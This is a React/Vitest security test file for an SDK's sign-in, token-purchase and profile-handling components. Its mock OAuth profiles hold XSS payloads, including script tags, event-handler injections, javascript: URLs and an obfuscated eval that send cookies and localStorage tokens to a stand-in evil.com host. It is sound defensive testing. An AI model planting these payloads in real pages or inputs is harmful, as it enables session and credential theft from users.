/**
 * React Component Security Tests for Echo React SDK
 *
 * SECURITY TESTING DOCUMENTATION:
 *
 * These tests verify that React components properly implement client-side
 * security protections and don't introduce vulnerabilities through unsafe
 * rendering or API usage patterns.
 *
 * COMPONENT SECURITY CONCERNS:
 * 1. XSS through unsafe user data rendering
 * 2. API abuse through unthrottled user actions
 * 3. CSP violations through popup usage
 * 4. State injection through malicious OAuth callbacks
 *
 * WHY COMPONENT-LEVEL TESTING IS CRITICAL:
 * - Security utilities are only effective if components use them correctly
 * - DOM rendering can introduce XSS even with sanitized data if used wrong
 * - User interactions can bypass client-side protections if not properly handled
 * - Component state can be manipulated through malicious props/context
 */

import { act, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import React from 'react';
import { beforeEach, describe, expect, test, vi } from 'vitest';
import { EchoContext } from '../../context';
import { EchoSignIn } from '../../components/EchoSignIn';
import { EchoTokens } from '../../components/EchoTokens';
import {
  createMockAuthenticatedUser,
  createMockAuthenticatedUserWithUserInfo,
  createMockUserManager,
  renderWithEcho,
} from '../utils/test-helpers';

describe('Component Security Integration', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('EchoSignIn - XSS Protection', () => {
    /**
     * SECURITY TEST: Verifies EchoSignIn component sanitizes user data before rendering
     *
     * VULNERABILITY: Displaying user.name directly could execute injected scripts
     * PROTECTION: Component should use sanitizeText() before rendering user data
     */
    // TODO: Re-enable when Next.js SDK is implemented (requires authentication)
    test.skip('sanitizes malicious user names in welcome message', async () => {
      // Create mock user with XSS payload - this simulates the real OIDC flow
      // where the userinfo endpoint provides clean data regardless of initial OAuth profile
      const maliciousOAuthProfile = {
        name: '<script>alert("XSS in name")</script>John Hacker',
        email: 'hacker@evil.com',
      };

      const userWithCleanData = await createMockAuthenticatedUserWithUserInfo(
        maliciousOAuthProfile
      );

      const mockUserManager = createMockUserManager({
        getUser: vi.fn().mockResolvedValue(userWithCleanData),
      });

      renderWithEcho(<EchoSignIn />, { mockUserManager });

      await waitFor(() => {
        expect(screen.getByText(/Signed in as/)).toBeInTheDocument();
      });

      // Verify no script tags in DOM
      const welcomeElement = screen.getByText(/Signed in as/);
      expect(welcomeElement.innerHTML).not.toContain('<script>');
      expect(welcomeElement.innerHTML).not.toContain('alert');

      // SECURITY: The userinfo endpoint provides clean data, ignoring malicious OAuth profile
      // This tests the end-to-end security model where userinfo is authoritative
      expect(welcomeElement.textContent).toContain('Test User'); // Clean data from userinfo
      expect(welcomeElement.textContent).not.toContain('John Hacker'); // Malicious data ignored
    });

    // TODO: Re-enable when Next.js SDK is implemented (requires authentication)
    test.skip('handles malicious email addresses safely', async () => {
      const maliciousUser = await createMockAuthenticatedUser({
        profile: {
          name: '',
          email: 'user@example.com<img src=x onerror="alert(\'Email XSS\')">',
        },
      });

      const mockUserManager = createMockUserManager({
        getUser: vi.fn().mockResolvedValue(maliciousUser),
      });

      renderWithEcho(<EchoSignIn />, { mockUserManager });

      await waitFor(() => {
        expect(screen.getByText(/Signed in as/)).toBeInTheDocument();
      });

      const welcomeElement = screen.getByText(/Signed in as/);
      expect(welcomeElement.innerHTML).not.toContain('<img');
      expect(welcomeElement.innerHTML).not.toContain('onerror');
    });

    test('prevents XSS through props and callbacks', async () => {
      const maliciousOnSuccess = vi.fn();
      const maliciousOnError = vi.fn();

      // Test with potentially dangerous className
      const maliciousClassName =
        'safe-class"><script>alert("CSS XSS")</script><div class="';

      renderWithEcho(
        <EchoSignIn
          className={maliciousClassName}
          onSuccess={maliciousOnSuccess}
          onError={maliciousOnError}
        />
      );

      // Component should render safely even with malicious props
      const signInContainer = screen
        .getByText(/sign in|signing in/i)
        .closest('div');
      expect(signInContainer?.className).toContain('safe-class');

      // Should not execute script from className
      expect(document.querySelector('script')).toBeNull();
    });
  });

  // TODO: Re-enable when Next.js SDK is implemented (requires authentication)
  describe.skip('EchoTokens - CSP Compatibility & Security (requires auth)', () => {
    /**
     * SECURITY TEST: Verifies payment component uses CSP-compatible payment flow
     *
     * VULNERABILITY: Direct window.open() calls violate CSP policies
     * PROTECTION: Component should use openPaymentFlow() for CSP compatibility
     */
    test('uses CSP-compatible payment flow instead of direct popups', async () => {
      const authenticatedUser = await createMockAuthenticatedUser();
      const mockUserManager = createMockUserManager({
        getUser: vi.fn().mockResolvedValue(authenticatedUser),
      });

      // Let MSW handle the API requests

      // Mock window.open to simulate CSP environment
      window.open = vi.fn().mockReturnValue(null);

      await act(async () => {
        renderWithEcho(<EchoTokens amount={100} />, { mockUserManager });
      });

      await waitFor(() => {
        expect(screen.getByRole('button')).toBeInTheDocument();
      });

      const purchaseButton = screen.getByRole('button');
      await userEvent.click(purchaseButton);

      // Should open the modal with purchase options
      await waitFor(() => {
        expect(screen.getByText('Credits')).toBeInTheDocument();
        expect(screen.getByText('Add $10 Credits')).toBeInTheDocument();
      });

      // Click the Add Credits button to trigger the payment flow
      const addCreditsButton = screen.getByText('Add $10 Credits');
      await userEvent.click(addCreditsButton);

      // Should attempt to open payment flow (which will be mocked)
      await waitFor(() => {
        expect(window.open).toHaveBeenCalledWith(
          expect.stringContaining('stripe.com/payment-link/mock-10'),
          'echo-payment',
          'width=600,height=700,scrollbars=yes,resizable=yes'
        );
      });
    });

    test('rejects malicious payment URLs to prevent injection', async () => {
      const authenticatedUser = await createMockAuthenticatedUser();
      const mockUserManager = createMockUserManager({
        getUser: vi.fn().mockResolvedValue(authenticatedUser),
      });

      // MSW will handle the API call and return a safe URL due to URL sanitization

      await act(async () => {
        renderWithEcho(<EchoTokens amount={100} />, { mockUserManager });
      });

      await waitFor(() => {
        expect(screen.getByRole('button')).toBeInTheDocument();
      });

      const purchaseButton = screen.getByRole('button');

      // Should handle malicious URL gracefully without throwing
      await expect(async () => {
        await userEvent.click(purchaseButton);
      }).not.toThrow();

      // Should not navigate to dangerous URL
      expect(window.location.href).not.toContain('javascript:');

      // No malicious scripts should be executed
      expect(document.querySelector('script')).toBeNull();
    });

    test('prevents amount manipulation attacks', async () => {
      const authenticatedUser = await createMockAuthenticatedUser();
      const mockUserManager = createMockUserManager({
        getUser: vi.fn().mockResolvedValue(authenticatedUser),
      });

      // Test with a single malicious amount to keep test simple
      const maliciousAmount = -100;

      // MSW will handle the API call with the malicious amount

      await act(async () => {
        renderWithEcho(<EchoTokens amount={maliciousAmount} />, {
          mockUserManager,
        });
      });

      await waitFor(() => {
        expect(screen.getByRole('button')).toBeInTheDocument();
      });

      const purchaseButton = screen.getByRole('button');
      await userEvent.click(purchaseButton);

      // Should open the modal with purchase options
      await waitFor(() => {
        expect(screen.getByText('Credits')).toBeInTheDocument();
        expect(screen.getByText('Add $10 Credits')).toBeInTheDocument();
      });

      // Click "Choose different amount" to enable custom amount input
      const chooseDifferentAmountButton = screen.getByText(
        'Choose different amount'
      );
      await userEvent.click(chooseDifferentAmountButton);

      // Enter the malicious negative amount
      const amountInput = screen.getByRole('spinbutton');
      await userEvent.clear(amountInput);
      await userEvent.type(amountInput, '-100');

      // Verify that the "Add Credits" button is disabled for invalid amounts
      const addCreditsButton = screen.getByText('Add Credits');
      expect(addCreditsButton).toBeDisabled();

      // The component should prevent clicking when amount is invalid
      // This is client-side protection against amount manipulation
    });
  });

  // TODO: Re-enable when Next.js SDK is implemented (requires authentication)
  describe.skip('EchoProvider - Profile Data Sanitization (requires auth)', () => {
    /**
     * SECURITY TEST: Verifies EchoProvider sanitizes OAuth profile data
     *
     * VULNERABILITY: Malicious OAuth providers can inject scripts in profile data
     * PROTECTION: Provider should sanitize all profile data using sanitizeUserProfile()
     */
    test('userinfo endpoint provides clean data ignoring malicious OAuth profile', async () => {
      // SECURITY TEST: End-to-end security model verification
      // This tests that malicious OAuth profile data is completely ignored
      // and clean data from the userinfo endpoint is used instead

      const maliciousOAuthProfile = {
        sub: 'hacker-123',
        name: "<svg onload=\"fetch('/api/admin').then(r=>r.json()).then(d=>fetch('https://evil.com', {method:'POST', body:JSON.stringify(d)}))\">Evil Admin",
        email:
          'admin@company.com"><iframe src="https://phishing.com"></iframe>',
        picture:
          'javascript:window.location="https://evil.com/steal?token="+localStorage.getItem("token")',
        given_name: '<script>document.body.innerHTML=""</script>Compromised',
        preferred_username: 'admin"><img src=x onerror=alert("xss")>',
      };

      // This simulates the real OIDC flow where userinfo endpoint provides authoritative data
      const userWithCleanData = await createMockAuthenticatedUserWithUserInfo(
        maliciousOAuthProfile
      );

      const mockUserManager = createMockUserManager({
        getUser: vi.fn().mockResolvedValue(userWithCleanData),
      });

      const TestComponent = () => {
        const context = React.useContext(EchoContext);
        if (!context) {
          return <div>No context</div>;
        }
        const { user } = context;
        return (
          <div>
            <div data-testid="user-name">{user?.name}</div>
            <div data-testid="user-email">{user?.email}</div>
            <div data-testid="user-picture">{user?.picture}</div>
            <div data-testid="user-id">{user?.id}</div>
          </div>
        );
      };

      renderWithEcho(<TestComponent />, { mockUserManager });

      await waitFor(() => {
        expect(screen.getByTestId('user-name')).toBeInTheDocument();
      });

      // SECURITY: Verify that clean data from userinfo endpoint is used
      const nameElement = screen.getByTestId('user-name');
      const emailElement = screen.getByTestId('user-email');
      const pictureElement = screen.getByTestId('user-picture');
      const idElement = screen.getByTestId('user-id');

      // Clean data from userinfo endpoint should be displayed
      expect(nameElement.textContent).toBe('Test User'); // Clean data
      expect(emailElement.textContent).toBe('test@example.com'); // Clean data
      expect(pictureElement.textContent).toBe('https://example.com/avatar.jpg'); // Clean data
      expect(idElement.textContent).toBe('user-123'); // Clean data

      // Malicious OAuth profile data should be completely ignored
      expect(nameElement.textContent).not.toContain('Evil Admin');
      expect(emailElement.textContent).not.toContain('admin@company.com');
      expect(idElement.textContent).not.toContain('hacker-123');

      // Verify no dangerous content in DOM
      expect(nameElement.innerHTML).not.toContain('<svg');
      expect(nameElement.innerHTML).not.toContain('onload');
      expect(nameElement.innerHTML).not.toContain('script');
      expect(emailElement.innerHTML).not.toContain('<iframe');
      expect(emailElement.innerHTML).not.toContain('phishing');
      expect(pictureElement.innerHTML).not.toContain('javascript:');

      // Verify no dangerous scripts/elements exist anywhere in DOM
      expect(document.querySelector('svg[onload]')).toBeNull();
      expect(document.querySelector('iframe')).toBeNull();
      expect(document.querySelector('script')).toBeNull();
    });

    test('protects against compromised OAuth provider attacks', async () => {
      // SECURITY TEST: Integration test for malicious OAuth provider scenario
      // This tests the complete security model where a compromised OAuth provider
      // tries to inject malicious data, but the userinfo endpoint provides safe data

      const maliciousOAuthProfile = {
        sub: 'admin', // Try to impersonate admin
        name: 'SYSTEM ADMINISTRATOR<script>window.location="https://evil.com/steal?data="+document.cookie</script>',
        email:
          'root@company.com<iframe src="https://malware.com/payload"></iframe>',
        picture:
          'javascript:fetch("https://evil.com/exfiltrate", {method:"POST", body:JSON.stringify({token:localStorage.getItem("token"), cookies:document.cookie})})',
        preferred_username:
          'admin<img src=x onerror="eval(atob(\'d2luZG93LmxvY2F0aW9uPSJodHRwczovL2V2aWwuY29tL3N0ZWFsP2Nvb2tpZXM9Iitkb2N1bWVudC5jb29raWU=\'))">',
        given_name: 'Admin',
        family_name: 'User<svg onload="fetch(\'https://evil.com/steal\')">',
        // Additional dangerous fields that real OAuth providers might include
        custom_claim: '"><script>alert("custom_claim_xss")</script>',
        role: 'admin',
        permissions: ['read', 'write', 'admin'],
      };

      // The userinfo endpoint should ignore all of this and return clean data
      const userWithCleanData = await createMockAuthenticatedUserWithUserInfo(
        maliciousOAuthProfile
      );

      const mockUserManager = createMockUserManager({
        getUser: vi.fn().mockResolvedValue(userWithCleanData),
      });

      const TestComponent = () => {
        const context = React.useContext(EchoContext);
        if (!context) {
          return <div>No context</div>;
        }
        const { user } = context;
        return (
          <div>
            <div data-testid="user-display">
              Hello, {user?.name} ({user?.email})
            </div>
            <div data-testid="user-all-data">{JSON.stringify(user)}</div>
          </div>
        );
      };

      renderWithEcho(<TestComponent />, { mockUserManager });

      await waitFor(() => {
        expect(screen.getByTestId('user-display')).toBeInTheDocument();
      });

      const displayElement = screen.getByTestId('user-display');
      const allDataElement = screen.getByTestId('user-all-data');

      // SECURITY: Verify that ONLY clean data from userinfo endpoint is displayed
      expect(displayElement.textContent).toBe(
        'Hello, Test User (test@example.com)'
      );

      // Verify malicious data is completely absent
      expect(displayElement.textContent).not.toContain('SYSTEM ADMINISTRATOR');
      expect(displayElement.textContent).not.toContain('root@company.com');
      expect(displayElement.textContent).not.toContain('admin');

      // Verify no scripts or dangerous HTML in the content
      expect(displayElement.innerHTML).not.toContain('<script>');
      expect(displayElement.innerHTML).not.toContain('<iframe>');
      expect(displayElement.innerHTML).not.toContain('<svg');
      expect(displayElement.innerHTML).not.toContain('javascript:');
      expect(displayElement.innerHTML).not.toContain('onload');
      expect(displayElement.innerHTML).not.toContain('onerror');

      // Verify the complete user object only contains clean data
      const userDataText = allDataElement.textContent || '';
      const userData = JSON.parse(userDataText);

      expect(userData.id).toBe('user-123');
      expect(userData.name).toBe('Test User');
      expect(userData.email).toBe('test@example.com');
      expect(userData.picture).toBe('https://example.com/avatar.jpg');

      // Verify no malicious fields made it through
      expect(userData.name).not.toContain('SYSTEM ADMINISTRATOR');
      expect(userData.email).not.toContain('root@company.com');
      expect(userData).not.toHaveProperty('role');
      expect(userData).not.toHaveProperty('permissions');
      expect(userData).not.toHaveProperty('custom_claim');

      // Verify DOM is completely safe
      expect(document.querySelector('script')).toBeNull();
      expect(document.querySelector('iframe')).toBeNull();
      expect(document.querySelector('svg[onload]')).toBeNull();
      expect(document.querySelector('img[onerror]')).toBeNull();
    });

    // TODO: Re-enable when Next.js SDK is implemented (SSR-related)
    test.skip('handles OAuth callback parameter injection', async () => {
      // Mock malicious OAuth callback URL with injected parameters
      const originalLocation = window.location;
      const mockUser = await createMockAuthenticatedUser();

      // Create a mock location object
      const mockLocation = {
        ...originalLocation,
        search:
          '?code=<script>alert("OAuth XSS")</script>&state=<img src=x onerror=alert("State XSS")>',
      };

      // Replace window.location with our mock
      Object.defineProperty(window, 'location', {
        value: mockLocation,
        writable: true,
        configurable: true,
      });

      const mockUserManager = createMockUserManager({
        signinRedirectCallback: vi.fn().mockResolvedValue(mockUser),
      });

      renderWithEcho(<div>Test</div>, { mockUserManager });

      // Should handle OAuth callback without executing injected scripts
      await waitFor(() => {
        expect(mockUserManager.signinRedirectCallback).toHaveBeenCalled();
      });

      // Verify no script injection occurred
      expect(document.querySelector('script')).toBeNull();

      // Restore original location
      Object.defineProperty(window, 'location', {
        value: originalLocation,
        writable: true,
        configurable: true,
      });
    });
  });
});
